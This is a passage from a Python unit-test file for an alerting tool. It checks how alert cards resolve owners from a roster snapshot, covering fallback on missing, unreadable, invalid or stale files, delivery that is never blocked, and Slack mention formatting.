    def test_the_snapshot_age_is_reported_even_on_the_happy_path(self):
        self._fresh_roster()
        MSG.ingest(msg2(event_id='r', group_key='r', owner='alice'))
        card = self._card('r')
        self.assertIsNotNone(card['roster_generated_at'])
        self.assertGreaterEqual(card['roster_age_seconds'], 0)
        self.assertLess(card['roster_age_seconds'], 60)

    # ---- the six ways resolution falls back, none of them silent ----
    def test_no_owner_declared_falls_back_to_the_box_owner(self):
        self._fresh_roster()
        MSG.ingest(msg2(event_id='r', group_key='r'))
        resolved = self._card('r')['owner_resolved']
        self.assertEqual(resolved['owner'], self.BOX_OWNER)
        self.assertTrue(resolved['fallback'])
        self.assertEqual(resolved['fallback_reason'], 'no-owner-declared')

    def test_an_unresolvable_owner_falls_back_and_names_the_reason(self):
        self._fresh_roster()
        MSG.ingest(msg2(event_id='r', group_key='r', owner='ghost'))
        resolved = self._card('r')['owner_resolved']
        self.assertEqual(resolved['owner'], self.BOX_OWNER)
        self.assertTrue(resolved['fallback'])
        self.assertEqual(resolved['fallback_reason'], 'unknown-owner')

    def test_no_roster_configured_falls_back(self):
        MSG.set_roster_path('')                 # the setUp default; explicit for clarity
        MSG.ingest(msg2(event_id='r', group_key='r', owner='alice'))
        resolved = self._card('r')['owner_resolved']
        self.assertEqual(resolved['owner'], self.BOX_OWNER)
        self.assertTrue(resolved['fallback'])
        self.assertEqual(resolved['fallback_reason'], 'not-configured')

    def test_a_missing_file_falls_back(self):
        MSG.set_roster_path(os.path.join(self.tmpdir, 'does-not-exist.json'))
        MSG.ingest(msg2(event_id='r', group_key='r', owner='alice'))
        resolved = self._card('r')['owner_resolved']
        self.assertEqual(resolved['owner'], self.BOX_OWNER)
        self.assertTrue(resolved['fallback'])
        self.assertEqual(resolved['fallback_reason'], 'missing')

    @unittest.skipIf(os.geteuid() == 0, 'root bypasses the permission bits this test relies on')
    def test_an_unreadable_file_falls_back(self):
        # The one condition a passing suite on a developer's own account never produces by
        # accident — it has to be engineered, so it is: chmod the snapshot unreadable.
        self._fresh_roster()
        os.chmod(self.roster_path, 0o000)
        try:
            MSG.ingest(msg2(event_id='r', group_key='r', owner='alice'))
            resolved = self._card('r')['owner_resolved']
        finally:
            os.chmod(self.roster_path, 0o600)
        self.assertEqual(resolved['owner'], self.BOX_OWNER)
        self.assertTrue(resolved['fallback'])
        self.assertEqual(resolved['fallback_reason'], 'unreadable')

    def test_unparseable_json_falls_back(self):
        with open(self.roster_path, 'w', encoding='utf-8') as fh:
            fh.write('{not json')
        MSG.set_roster_path(self.roster_path)
        MSG.ingest(msg2(event_id='r', group_key='r', owner='alice'))
        resolved = self._card('r')['owner_resolved']
        self.assertEqual(resolved['owner'], self.BOX_OWNER)
        self.assertTrue(resolved['fallback'])
        self.assertEqual(resolved['fallback_reason'], 'invalid-json')

    def test_missing_generated_at_falls_back(self):
        with open(self.roster_path, 'w', encoding='utf-8') as fh:
            json.dump({'source': 'test', 'people': {'@alice': {'name': 'Alice'}}}, fh)
        MSG.set_roster_path(self.roster_path)
        MSG.ingest(msg2(event_id='r', group_key='r', owner='alice'))
        resolved = self._card('r')['owner_resolved']
        self.assertEqual(resolved['owner'], self.BOX_OWNER)
        self.assertTrue(resolved['fallback'])
        self.assertEqual(resolved['fallback_reason'], 'missing-generated-at')

    def test_a_snapshot_older_than_72h_falls_back(self):
        stale_at = MSG.iso(MSG.now_utc() - timedelta(hours=73))
        _write_roster(self.roster_path, stale_at)
        MSG.set_roster_path(self.roster_path)
        MSG.ingest(msg2(event_id='r', group_key='r', owner='alice'))
        resolved = self._card('r')['owner_resolved']
        self.assertEqual(resolved['owner'], self.BOX_OWNER)
        self.assertTrue(resolved['fallback'])
        self.assertEqual(resolved['fallback_reason'], 'stale')

    def test_a_snapshot_just_under_72h_still_resolves(self):
        fresh_at = MSG.iso(MSG.now_utc() - timedelta(hours=71))
        _write_roster(self.roster_path, fresh_at)
        MSG.set_roster_path(self.roster_path)
        MSG.ingest(msg2(event_id='r', group_key='r', owner='alice'))
        resolved = self._card('r')['owner_resolved']
        self.assertFalse(resolved['fallback'])
        self.assertEqual(resolved['name'], 'Alice Example')

    def test_stale_still_reports_the_snapshots_own_age(self):
        # The substitution must be visible, and so must how old the name it fell back from
        # was — a fallback that cannot say why is indistinguishable from a silent one.
        stale_at = MSG.iso(MSG.now_utc() - timedelta(hours=100))
        _write_roster(self.roster_path, stale_at)
        MSG.set_roster_path(self.roster_path)
        MSG.ingest(msg2(event_id='r', group_key='r', owner='alice'))
        card = self._card('r')
        self.assertTrue(card['owner_resolved']['fallback'])
        self.assertIsNotNone(card['roster_generated_at'])
        self.assertGreaterEqual(card['roster_age_seconds'], 100 * 3600 - 5)

    # ---- delivery is never blocked by any of the above ----
    def test_every_fallback_reason_still_enqueues_the_card(self):
        for reason_setup in (
                lambda: MSG.set_roster_path(''),
                lambda: MSG.set_roster_path(os.path.join(self.tmpdir, 'nope.json')),
                lambda: (self._fresh_roster(), None)[1],
        ):
            fresh_db()
            MSG.set_box_owner(self.BOX_OWNER)
            reason_setup()
            result = MSG.ingest(msg2(event_id='e', group_key='e', severity='page',
                                     owner='ghost'))
            self.assertEqual(result, 'inserted')
            self.assertEqual(
                MSG._conn().execute(
                    "SELECT COUNT(*) FROM deliveries WHERE card_id='e'").fetchone()[0],
                1, 'an unresolvable owner must not block delivery')

    # ---- Slack mention ----
    def test_slack_mentions_the_resolved_member_id(self):
        self._fresh_roster()
        MSG.ingest(msg2(event_id='r', group_key='r', severity='page', owner='alice'))
        due = MSG.claim_due_deliveries('slack-urgent')[0]
        text = devmon_slack.format_text(due)
        self.assertIn('<@U01ALICE>', text)

    def test_slack_omits_the_mention_on_fallback(self):
        MSG.set_roster_path('')                 # unconfigured -> always falls back
        MSG.ingest(msg2(event_id='r', group_key='r', severity='page', owner='alice'))
        due = MSG.claim_due_deliveries('slack-urgent')[0]
        text = devmon_slack.format_text(due)
        self.assertNotIn('Owner:', text)

    def test_slack_omits_the_mention_when_no_owner_was_declared(self):
        self._fresh_roster()
        MSG.ingest(msg2(event_id='r', group_key='r', severity='page'))
        due = MSG.claim_due_deliveries('slack-urgent')[0]
        text = devmon_slack.format_text(due)
        self.assertNotIn('Owner:', text)


if __name__ == '__main__':
    unittest.main(verbosity=2)
